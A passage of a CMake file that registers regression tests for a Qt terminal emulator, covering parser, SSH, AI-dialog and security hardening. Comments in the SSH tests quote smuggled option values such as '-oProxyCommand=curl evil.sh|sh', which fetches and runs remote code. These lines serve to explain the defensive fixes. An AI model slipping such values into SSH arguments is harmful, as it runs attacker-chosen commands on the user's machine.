    # DCS / APC / IgnoreString state. Pre-fix, the parser transitioned
    # to Escape state on a mid-string ESC and dispatched the trailing
    # byte as a fresh ESC sequence (RIS / IND / DECSC / ...), giving a
    # hostile remote shell an RCE-adjacent trigger via OSC payloads.
    # 0.7.53 added OscStringEsc / DcsStringEsc / ApcStringEsc /
    # IgnoreStringEsc peek-states that consume the trailing byte and
    # return to Ground. See tests/features/vt_osc_esc_discard/spec.md.
    add_executable(test_vt_osc_esc_discard
        tests/features/vt_osc_esc_discard/test_vt_osc_esc_discard.cpp
        src/vtparser.cpp
    )
    target_include_directories(test_vt_osc_esc_discard PRIVATE src)
    target_compile_options(test_vt_osc_esc_discard PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME vt_osc_esc_discard COMMAND test_vt_osc_esc_discard)
    set_tests_properties(vt_osc_esc_discard PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # vtparser_print_run_coalesce — asserts that the 0.7.17 Print-run
    # coalescing (SIMD scan emits one VtAction::Print per safe-ASCII run
    # + TerminalGrid::handleAsciiPrintRun batches per-row writes)
    # produces grid state byte-identical to feeding the same bytes
    # one at a time through the scalar handlePrint path. Locks the
    # fast-path semantic equivalence that vtparser_simd_scan cannot
    # observe (that test is action-stream level, this one is grid
    # state). See tests/features/vtparser_print_run_coalesce/spec.md.
    add_executable(test_vtparser_print_run_coalesce
        tests/features/vtparser_print_run_coalesce/test_print_run_coalesce.cpp
        src/vtparser.cpp
        src/terminalgrid.cpp
    )
    target_include_directories(test_vtparser_print_run_coalesce PRIVATE src)
    target_link_libraries(test_vtparser_print_run_coalesce PRIVATE
        Qt6::Core Qt6::Gui
    )
    target_compile_options(test_vtparser_print_run_coalesce PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME vtparser_print_run_coalesce COMMAND test_vtparser_print_run_coalesce)
    set_tests_properties(vtparser_print_run_coalesce PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # combining_on_resize — asserts that TerminalGrid::resize preserves the
    # per-line combining-char side table on both main screen and alt
    # screen, and cleanly evicts combining entries whose column falls
    # outside the new width. Regression test for the 0.6.28 fix; before
    # it, every window resize wiped accents/ZWJ/diacritics because the
    # simple-copy path walked cells only. See spec.md.
    add_executable(test_combining_on_resize
        tests/features/combining_on_resize/test_combining.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(test_combining_on_resize PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_combining_on_resize PRIVATE src)
    target_compile_options(test_combining_on_resize PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME combining_on_resize COMMAND test_combining_on_resize)
    set_tests_properties(combining_on_resize PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # osc8_insert_delete_lines — regression guard for the 0.7.7 fix that
    # runs the same erase/insert pattern against m_screenHyperlinks during
    # CSI L / CSI M as the main cell vector, so OSC 8 spans stay anchored
    # to the cells that contain the clickable text. Pre-fix, a single
    # Insert Line shifted the underline visually but left the clickable
    # rectangle on the old row.
    add_executable(test_osc8_insert_delete_lines
        tests/features/osc8_insert_delete_lines/test_osc8_linerange.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(test_osc8_insert_delete_lines PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_osc8_insert_delete_lines PRIVATE src)
    target_compile_options(test_osc8_insert_delete_lines PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME osc8_insert_delete_lines COMMAND test_osc8_insert_delete_lines)
    set_tests_properties(osc8_insert_delete_lines PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # hyperlink_resize_clamp — regression guard for the 0.7.7 clamp added
    # to m_hyperlinkStartRow / m_hyperlinkStartCol in TerminalGrid::resize.
    # Pre-fix, a shrink resize that left the open hyperlink's start row
    # out-of-range caused the subsequent OSC 8 close to silently drop the
    # span (the existing upper-bound guard at handleOsc swallowed it).
    # Post-fix, the start coordinates clamp at resize time so the span
    # commits on the clamped row.
    add_executable(test_hyperlink_resize_clamp
        tests/features/hyperlink_resize_clamp/test_hyperlink_resize_clamp.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(test_hyperlink_resize_clamp PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_hyperlink_resize_clamp PRIVATE src)
    target_compile_options(test_hyperlink_resize_clamp PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME hyperlink_resize_clamp COMMAND test_hyperlink_resize_clamp)
    set_tests_properties(hyperlink_resize_clamp PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # ssh_dash_host_rejected — regression guard for the 0.7.7 CVE-2017-
    # 1000117-class fix. SshBookmark::toSshCommand must emit `--` before
    # the host argument, so OpenSSH will never parse a host value that
    # begins with `-` as an option (e.g. -oProxyCommand=bash -c 'evil').
    # Shell-quoting alone does not defend against this — the shell passes
    # the value correctly but ssh itself re-parses the leading dash.
    add_executable(test_ssh_dash_host_rejected
        tests/features/ssh_dash_host_rejected/test_ssh_dash.cpp
        src/sshdialog.cpp
    )
    target_link_libraries(test_ssh_dash_host_rejected PRIVATE
        Qt6::Core
        Qt6::Widgets
    )
    target_include_directories(test_ssh_dash_host_rejected PRIVATE src)
    target_compile_options(test_ssh_dash_host_rejected PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME ssh_dash_host_rejected COMMAND test_ssh_dash_host_rejected)
    set_tests_properties(ssh_dash_host_rejected PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # ssh_extra_args_sanitize — asserts the 0.7.12 /indie-review fix that
    # rejects ProxyCommand/LocalCommand/PermitLocalCommand from extraArgs.
    # Without this filter a bookmark field carrying
    # `-oProxyCommand=curl evil.sh|sh` hands OpenSSH an attacker-chosen
    # shell command (executed via /bin/sh -c). See
    # tests/features/ssh_extra_args_sanitize/spec.md.
    add_executable(test_ssh_extra_args_sanitize
        tests/features/ssh_extra_args_sanitize/test_ssh_extra_args.cpp
        src/sshdialog.cpp
    )
    target_link_libraries(test_ssh_extra_args_sanitize PRIVATE
        Qt6::Core
        Qt6::Widgets
    )
    target_include_directories(test_ssh_extra_args_sanitize PRIVATE src)
    target_compile_options(test_ssh_extra_args_sanitize PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME ssh_extra_args_sanitize COMMAND test_ssh_extra_args_sanitize)
    set_tests_properties(ssh_extra_args_sanitize PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # shellutils_whitelist — asserts the 0.7.57 /indie-review fix
    # (ANTS-1047) that switched shellQuote from a denylist regex to a
    # whitelist. Pre-fix, glob/redirection/bracket characters slipped
    # through unquoted; the test feeds each of the previously-missed
    # classes plus the existing happy path. See
    # tests/features/shellutils_whitelist/spec.md.
    add_executable(test_shellutils_whitelist
        tests/features/shellutils_whitelist/test_shellutils_whitelist.cpp
    )
    target_link_libraries(test_shellutils_whitelist PRIVATE Qt6::Core)
    target_include_directories(test_shellutils_whitelist PRIVATE src)
    target_compile_options(test_shellutils_whitelist PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME shellutils_whitelist COMMAND test_shellutils_whitelist)
    set_tests_properties(shellutils_whitelist PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # ai_insert_command_sanitize — asserts the 0.7.12 /indie-review
    # OWASP LLM01+LLM02 fix: AI-suggested commands pass through
    # control-char strip + 4 KiB cap, AND the click handler gates the
    # insertCommand emit on a user confirmation dialog. See
    # tests/features/ai_insert_command_sanitize/spec.md.
    add_executable(test_ai_insert_command_sanitize
        tests/features/ai_insert_command_sanitize/test_ai_insert_command.cpp
        src/aidialog.cpp
    )
    target_link_libraries(test_ai_insert_command_sanitize PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
        Qt6::Network
    )
    target_include_directories(test_ai_insert_command_sanitize PRIVATE src)
    target_compile_options(test_ai_insert_command_sanitize PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_ai_insert_command_sanitize PRIVATE
        SRC_AI_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/aidialog.cpp"
    )
    add_test(NAME ai_insert_command_sanitize COMMAND test_ai_insert_command_sanitize)
    set_tests_properties(ai_insert_command_sanitize PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_git_context_hook — installer source-grep test for the
    # UserPromptSubmit git-context hook. Asserts SettingsDialog's new
    # installClaudeGitContextHook writes the canonical script, targets
    # UserPromptSubmit in ~/.claude/settings.json, preserves existing
    # entries, refuses to clobber a corrupt settings file, and wires a
    # dedicated UI button. See tests/features/claude_git_context_hook/spec.md.
    add_executable(test_claude_git_context_installer
        tests/features/claude_git_context_hook/test_installer_grep.cpp
    )
    target_compile_options(test_claude_git_context_installer PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_claude_git_context_installer PRIVATE
        SRC_SETTINGSDIALOG_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
        SRC_SETTINGSDIALOG_H="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.h"
        SRC_CONFIGPATHS_H="${CMAKE_CURRENT_SOURCE_DIR}/src/configpaths.h"
    )
    add_test(NAME claude_git_context_installer
             COMMAND test_claude_git_context_installer)
    set_tests_properties(claude_git_context_installer PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_git_context_script — behavioral test of the bash script the
    # installer writes. Extracts the script body from settingsdialog.cpp
    # (single source of truth) and exercises it across five scenarios:
    # not-a-repo, git-missing, clean repo, dirty repo (1/1/1 counts),
    # CLAUDE_PROJECT_DIR override.
    add_test(NAME claude_git_context_script
             COMMAND bash "${CMAKE_CURRENT_SOURCE_DIR}/tests/features/claude_git_context_hook/test_script.sh")
    set_tests_properties(claude_git_context_script PROPERTIES
        LABELS "features;fast"
        TIMEOUT 30
        ENVIRONMENT "SRC_SETTINGSDIALOG_CPP=${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp")

    # ai_context_redaction — OWASP LLM06 defense. Asserts the 14 secret
    # shapes in src/secretredact.h redact with the correct [REDACTED:<kind>]
    # label, negative controls (UUID, commit SHA, plain URLs, prose) pass
    # through verbatim, priority ordering puts sk-ant-… before legacy
    # sk-…, and AiDialog::sendRequest wires scrub() to both the terminal
    # context and the user message before either reaches the JSON body.
    # See tests/features/ai_context_redaction/spec.md.
    add_executable(test_ai_context_redaction
        tests/features/ai_context_redaction/test_ai_context_redaction.cpp
    )
    target_link_libraries(test_ai_context_redaction PRIVATE
        Qt6::Core
    )
    target_include_directories(test_ai_context_redaction PRIVATE src)
    target_compile_options(test_ai_context_redaction PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_ai_context_redaction PRIVATE
        SRC_AIDIALOG_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/aidialog.cpp"
    )
    add_test(NAME ai_context_redaction COMMAND test_ai_context_redaction)
    set_tests_properties(ai_context_redaction PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # image_bomb_png_header_peek — regression guard for the 0.7.7 fix that
    # added QImageReader-based dimension peeks before QImage::loadFromData
    # on inline-image byte streams (OSC 1337 iTerm2 + Kitty APC PNG path).
    # Without the peek, a 1 KB compressed PNG declaring 100 000 × 100 000
    # forces a multi-GB decode allocation before the post-decode
    # MAX_IMAGE_DIM guard fires. Static source inspection — a runtime
    # image-bomb test would either succeed (no signal) or hang the test
    # process (no signal either), neither useful in CI.
    add_executable(test_image_bomb_png_header_peek
        tests/features/image_bomb_png_header_peek/test_image_bomb.cpp
    )
    target_compile_definitions(test_image_bomb_png_header_peek PRIVATE
        SRC_TERMINALGRID_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalgrid.cpp"
        SRC_TERMINALGRID_HEADER="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalgrid.h"
    )
    target_compile_options(test_image_bomb_png_header_peek PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME image_bomb_png_header_peek
             COMMAND test_image_bomb_png_header_peek)
    set_tests_properties(image_bomb_png_header_peek PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # shift_enter_bracketed_paste — locks the 0.6.30 fix for "tab freezes
    # after Shift+Enter". The 0.6.26 regression used
    #     QByteArray("\x1B[200~\n\x1B[201~", 8)
    # — a 13-byte literal with a hand-coded length of 8, dropping the
    # closing [201~ end-paste marker and wedging the shell in bracketed-
    # paste mode. Fix switched to QByteArrayLiteral(...) so size is
    # coupled to the literal.
    #
    # The test exercises two invariants: (A) the exact byte sequences
    # for both the bracketed-paste and fallback paths, and (B) a
    # source-level inspection of src/terminalwidget.cpp proving the
    # Shift+Enter handler still uses the size-coupled literal form and
    # gates on !(mods & ControlModifier). (B) is the direct regression
    # guard for the specific bug class — no QByteArray(literal, <num>)
    # forms may remain. Pure text + regex inspection; no TerminalWidget
    # instantiation (that class is QOpenGLWidget + live PTY + GL
    # renderer, far too heavy for a fast feature test).
    # See tests/features/shift_enter_bracketed_paste/spec.md.
    add_executable(test_shift_enter_bracketed_paste
        tests/features/shift_enter_bracketed_paste/test_shift_enter.cpp
    )
    target_link_libraries(test_shift_enter_bracketed_paste PRIVATE
        Qt6::Core
    )
    target_include_directories(test_shift_enter_bracketed_paste PRIVATE src)
    target_compile_options(test_shift_enter_bracketed_paste PRIVATE
        -Wall -Wextra -Wpedantic
    )
    # Bake the absolute source path in at compile time so the test can
    # open src/terminalwidget.cpp from the build directory — matches
    # the pattern used by allowlist_add and review_changes_click.
    target_compile_definitions(test_shift_enter_bracketed_paste PRIVATE
        SRC_TERMINALWIDGET_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalwidget.cpp"
    )
    add_test(NAME shift_enter_bracketed_paste
             COMMAND test_shift_enter_bracketed_paste)
    set_tests_properties(shift_enter_bracketed_paste PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # review_changes_clickable — locks the user-reported click-does-nothing
    # regression where refreshReviewButton's clean-repo branch left the
    # status-bar button in the visible-but-disabled state. Qt's
    # QAbstractButton swallows clicks on disabled buttons (no clicked()
    # signal, so the 0.6.29 silent-return-with-flash guards in
    # showDiffViewer never fire), and the global QPushButton:hover rule
    # is not :enabled-gated, so the button still highlighted on hover —
    # advertising itself as actionable while doing nothing. Source-grep
    # against src/mainwindow.cpp; no MainWindow instantiation needed.
    # See tests/features/review_changes_clickable/spec.md.
    add_executable(test_review_changes_clickable
        tests/features/review_changes_clickable/test_review_changes_clickable.cpp
    )
    target_link_libraries(test_review_changes_clickable PRIVATE
        Qt6::Core
    )
    target_include_directories(test_review_changes_clickable PRIVATE src)
    target_compile_options(test_review_changes_clickable PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_review_changes_clickable PRIVATE
        SRC_MAINWINDOW_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME review_changes_clickable
             COMMAND test_review_changes_clickable)
    set_tests_properties(review_changes_clickable PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # osc133_hmac_verification — locks the 0.7.0 OSC 133 HMAC verifier
    # invariants. Untrusted in-terminal processes can otherwise emit OSC
    # 133 markers and forge prompt regions / exit codes / the
    # command_finished plugin event. With $ANTS_OSC133_KEY set, every
    # marker must carry a matching ahmac= param computed as
    # HMAC-SHA256(key, "<marker>|<promptId>[|<exitCode>]"). Test exercises
    # verifier OFF (legacy permissive), verifier ON + valid HMAC,
    # verifier ON + missing/wrong/promptId-mismatch/exit-mismatch HMAC,
    # plus a source-grep guard on the env-var name.
    # See tests/features/osc133_hmac_verification/spec.md.
    add_executable(test_osc133_hmac_verification
        tests/features/osc133_hmac_verification/test_osc133_hmac.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(test_osc133_hmac_verification PRIVATE
        Qt6::Core
        Qt6::Gui  # QColor / QImage transitively required by terminalgrid.h
    )
    target_include_directories(test_osc133_hmac_verification PRIVATE src)
    target_compile_options(test_osc133_hmac_verification PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_osc133_hmac_verification PRIVATE
        SRC_TERMINALGRID_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalgrid.cpp"
    )
    add_test(NAME osc133_hmac_verification
             COMMAND test_osc133_hmac_verification)
    set_tests_properties(osc133_hmac_verification PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # ssh_control_master — locks the SSH ControlMaster auto-multiplexing
    # contract on SshBookmark::toSshCommand(bool). When controlMaster=true,
    # the built command must carry -o ControlMaster=auto / -o ControlPath=
    # <resolved $HOME>/.ssh/cm-%r@%h:%p / -o ControlPersist=10m, placed
    # before the [user@]host destination. The default call
    # (controlMaster=false) must be byte-identical to the pre-0.7.1
    # legacy command so existing bookmarks keep working.
    # See tests/features/ssh_control_master/spec.md.
    add_executable(test_ssh_control_master
        tests/features/ssh_control_master/test_ssh_control_master.cpp
        src/sshdialog.cpp
    )
    target_link_libraries(test_ssh_control_master PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets  # sshdialog.h transitively includes QDialog
    )
    target_include_directories(test_ssh_control_master PRIVATE src)
    target_compile_options(test_ssh_control_master PRIVATE
        -Wall -Wextra -Wpedantic
    )
    set_target_properties(test_ssh_control_master PROPERTIES
        AUTOMOC ON)
    add_test(NAME ssh_control_master
             COMMAND test_ssh_control_master)
    set_tests_properties(ssh_control_master PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # threaded_parse_equivalence — locks the 0.7.0 worker-thread invariant
    # that moving PTY read + VT parse off the GUI thread preserves action-
    # stream identity. 11 fixtures × 6 chunking strategies (whole, byte-by-
    # byte, 16 KB worker-flush cadence, 7-byte, 3-byte, two pseudo-random
    # seeds). See tests/features/threaded_parse_equivalence/spec.md.
    add_executable(test_threaded_parse_equivalence
        tests/features/threaded_parse_equivalence/test_threaded_parse_equivalence.cpp
        src/vtparser.cpp
    )
    target_include_directories(test_threaded_parse_equivalence PRIVATE src)
    target_compile_options(test_threaded_parse_equivalence PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME threaded_parse_equivalence
             COMMAND test_threaded_parse_equivalence)
    set_tests_properties(threaded_parse_equivalence PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # threaded_response_ordering — locks the contract that TerminalGrid's
    # ResponseCallback fires in parse order across DA1/CPR/DA2/mode-996/
    # DSR. End-to-end write order across the 0.7.0 worker boundary follows
    # from this + Qt's QueuedConnection FIFO guarantee. See spec.md.
    add_executable(test_threaded_response_ordering
        tests/features/threaded_response_ordering/test_threaded_response_ordering.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(test_threaded_response_ordering PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_threaded_response_ordering PRIVATE src)
    target_compile_options(test_threaded_response_ordering PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME threaded_response_ordering
             COMMAND test_threaded_response_ordering)
    set_tests_properties(threaded_response_ordering PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # threaded_ptywrite_gating — locks the 0.6.35 regression fix. Asserts
    # no `if (m_pty)` / `&& m_pty)` gate on any ptyWrite() call site in
    # TerminalWidget — m_pty is null on the worker path, so a bare-
    # pointer gate silently drops every write, which is exactly how the
    # keystroke-not-echoing bug shipped in 0.6.34.
    add_executable(test_threaded_ptywrite_gating
        tests/features/threaded_ptywrite_gating/test_threaded_ptywrite_gating.cpp
    )
    target_link_libraries(test_threaded_ptywrite_gating PRIVATE
        Qt6::Core
    )
    target_include_directories(test_threaded_ptywrite_gating PRIVATE src)
    target_compile_options(test_threaded_ptywrite_gating PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_threaded_ptywrite_gating PRIVATE
        SRC_TERMINALWIDGET_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalwidget.cpp"
    )
    add_test(NAME threaded_ptywrite_gating
             COMMAND test_threaded_ptywrite_gating)
    set_tests_properties(threaded_ptywrite_gating PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # threaded_resize_synchronous — locks the source-level invariant that
    # every invokeMethod(m_vtStream, "resize", ...) uses
    # Qt::BlockingQueuedConnection. A silent regression to QueuedConnection
    # would introduce a 1-frame flicker that only shows under load. Pure
    # source-grep test; same pattern as shift_enter_bracketed_paste.
    add_executable(test_threaded_resize_synchronous
        tests/features/threaded_resize_synchronous/test_threaded_resize_synchronous.cpp
    )
    target_link_libraries(test_threaded_resize_synchronous PRIVATE
        Qt6::Core
    )
    target_include_directories(test_threaded_resize_synchronous PRIVATE src)
    target_compile_options(test_threaded_resize_synchronous PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_threaded_resize_synchronous PRIVATE
        SRC_TERMINALWIDGET_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalwidget.cpp"
        SRC_VTSTREAM_HEADER_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/vtstream.h"
    )
    add_test(NAME threaded_resize_synchronous
             COMMAND test_threaded_resize_synchronous)
    set_tests_properties(threaded_resize_synchronous PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # wayland_quake_mode — locks the 0.6.38 Wayland-native Quake-mode
    # invariants. Source-grep test (same pattern as
    # threaded_resize_synchronous / shift_enter_bracketed_paste) asserting:
    # (1) the <LayerShellQt/Window> include is guarded by
    # ANTS_WAYLAND_LAYER_SHELL; (2) setupQuakeMode does a runtime
    # platformName() dispatch and preserves the X11-path flags;
    # (3) toggleQuakeVisibility skips the pos()-based animation on
    # Wayland; (4) the constructor wires the quake_hotkey config key to a
    # QShortcut invoking toggleQuakeVisibility (the config key was dead
    # pre-0.6.38); (5) CMakeLists.txt uses find_package(LayerShellQt
    # CONFIG QUIET) and links LayerShellQt::Interface when found.
    # See tests/features/wayland_quake_mode/spec.md.
    add_executable(test_wayland_quake_mode
        tests/features/wayland_quake_mode/test_wayland_quake_mode.cpp
    )
    target_link_libraries(test_wayland_quake_mode PRIVATE
        Qt6::Core
    )
    target_include_directories(test_wayland_quake_mode PRIVATE src)
    target_compile_options(test_wayland_quake_mode PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_wayland_quake_mode PRIVATE
        SRC_MAINWINDOW_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_CMAKELISTS_PATH="${CMAKE_CURRENT_SOURCE_DIR}/CMakeLists.txt"
    )
    add_test(NAME wayland_quake_mode
             COMMAND test_wayland_quake_mode)
    set_tests_properties(wayland_quake_mode PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # global_shortcuts_portal — locks the 0.6.39 Freedesktop Portal
    # GlobalShortcuts invariants. Source-grep test (same pattern as
    # wayland_quake_mode) asserting: (1) MainWindow gates portal
    # construction on isAvailable(); (2) canonical D-Bus service /
    # path / interface / method literals appear verbatim in the impl;
    # (3) MainWindow binds + matches the literal id "toggle-quake";
    # (4) the 0.6.38 in-app QShortcut fallback stays wired; (5) both
    # activation paths debounce via m_lastQuakeToggleMs; (6)
    # CMakeLists.txt lists the source + keeps Qt6::DBus linked;
    # (7) the header surfaces the expected public API.
    # See tests/features/global_shortcuts_portal/spec.md.
    add_executable(test_global_shortcuts_portal
        tests/features/global_shortcuts_portal/test_global_shortcuts_portal.cpp
    )
    target_link_libraries(test_global_shortcuts_portal PRIVATE
        Qt6::Core
    )
    target_include_directories(test_global_shortcuts_portal PRIVATE src)
    target_compile_options(test_global_shortcuts_portal PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_global_shortcuts_portal PRIVATE
        SRC_PORTAL_HEADER_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/globalshortcutsportal.h"
        SRC_PORTAL_IMPL_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/globalshortcutsportal.cpp"
        SRC_MAINWINDOW_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_CMAKELISTS_PATH="${CMAKE_CURRENT_SOURCE_DIR}/CMakeLists.txt"
    )
    add_test(NAME global_shortcuts_portal
             COMMAND test_global_shortcuts_portal)
    set_tests_properties(global_shortcuts_portal PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # osc133_last_command — locks the 0.6.40 "copy last output / re-run
    # last command" top-level actions. Source-grep style: verifies the
    # two public API slots, the backwards-walk skip-in-progress-tail
    # invariant, the deliberate outputTextAt choice over 100-line-capped
    # lastCommandOutput, and the configurable keybindings with
    # non-colliding defaults.
    # See tests/features/osc133_last_command/spec.md.
    add_executable(test_osc133_last_command
        tests/features/osc133_last_command/test_osc133_last_command.cpp
    )
    target_link_libraries(test_osc133_last_command PRIVATE
        Qt6::Core
    )
    target_include_directories(test_osc133_last_command PRIVATE src)
    target_compile_options(test_osc133_last_command PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_osc133_last_command PRIVATE
        SRC_TERMINALWIDGET_HEADER_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalwidget.h"
        SRC_TERMINALWIDGET_IMPL_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalwidget.cpp"
        SRC_MAINWINDOW_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_CMAKELISTS_PATH="${CMAKE_CURRENT_SOURCE_DIR}/CMakeLists.txt"
    )
    add_test(NAME osc133_last_command
             COMMAND test_osc133_last_command)
    set_tests_properties(osc133_last_command PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # command_mark_gutter — locks the 0.6.41 gutter + portal-status UX.
    # Source-grep: Config exposes show_command_marks (default true),
    # TerminalWidget paints a scrollbar-adjacent gutter gated on the
    # member + non-empty promptRegions(), three-state color branch
    # (exit 0 / non-zero / in-progress), MainWindow propagates the
    # toggle via applyConfigToTerminal, SettingsDialog surfaces both
    # the checkbox and the portal-binding status label.
    # See tests/features/command_mark_gutter/spec.md.
    add_executable(test_command_mark_gutter
        tests/features/command_mark_gutter/test_command_mark_gutter.cpp
    )
    target_link_libraries(test_command_mark_gutter PRIVATE
        Qt6::Core
    )
    target_include_directories(test_command_mark_gutter PRIVATE src)
    target_compile_options(test_command_mark_gutter PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_command_mark_gutter PRIVATE
        SRC_CONFIG_HEADER_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/config.h"
        SRC_CONFIG_IMPL_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/config.cpp"
        SRC_TERMINALWIDGET_HEADER_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalwidget.h"
        SRC_TERMINALWIDGET_IMPL_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalwidget.cpp"
        SRC_MAINWINDOW_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_SETTINGSDIALOG_HEADER_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.h"
        SRC_SETTINGSDIALOG_IMPL_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
        SRC_CMAKELISTS_PATH="${CMAKE_CURRENT_SOURCE_DIR}/CMakeLists.txt"
    )
    add_test(NAME command_mark_gutter
             COMMAND test_command_mark_gutter)
    set_tests_properties(command_mark_gutter PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # focus_redirect_menu_guard — locks the 2026-04-19 fix for the
    # File/Edit/View menubar hover-flash. The focus-redirect lambda in
    # mainwindow.cpp must early-return on popup-open AND when the cursor
    # is over a QMenu/QMenuBar ancestor, at BOTH queue time and
    # QTimer::singleShot fire time. Pure source grep.
    # See tests/features/focus_redirect_menu_guard/spec.md.
    add_executable(test_focus_redirect_menu_guard
        tests/features/focus_redirect_menu_guard/test_focus_redirect_menu_guard.cpp
    )
    target_link_libraries(test_focus_redirect_menu_guard PRIVATE
        Qt6::Core
    )
    target_include_directories(test_focus_redirect_menu_guard PRIVATE src)
    target_compile_options(test_focus_redirect_menu_guard PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_focus_redirect_menu_guard PRIVATE
        SRC_MAINWINDOW_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME focus_redirect_menu_guard
             COMMAND test_focus_redirect_menu_guard)
    set_tests_properties(focus_redirect_menu_guard PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # terminal_partial_update_mode — 0.7.4 follow-up. The dropdown-
    # flicker root cause was QOpenGLWidget's default NoPartialUpdate
    # mode cascading every terminal repaint into a full top-level
    # repaint. Fix is a single setUpdateBehavior(PartialUpdate) call
    # in the TerminalWidget constructor. See
    # tests/features/terminal_partial_update_mode/spec.md.
    add_executable(test_terminal_partial_update_mode
        tests/features/terminal_partial_update_mode/test_terminal_partial_update_mode.cpp
    )
    target_compile_options(test_terminal_partial_update_mode PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_terminal_partial_update_mode PRIVATE
        SRC_TERMINALWIDGET_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalwidget.h"
        SRC_TERMINALWIDGET_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalwidget.cpp"
    )
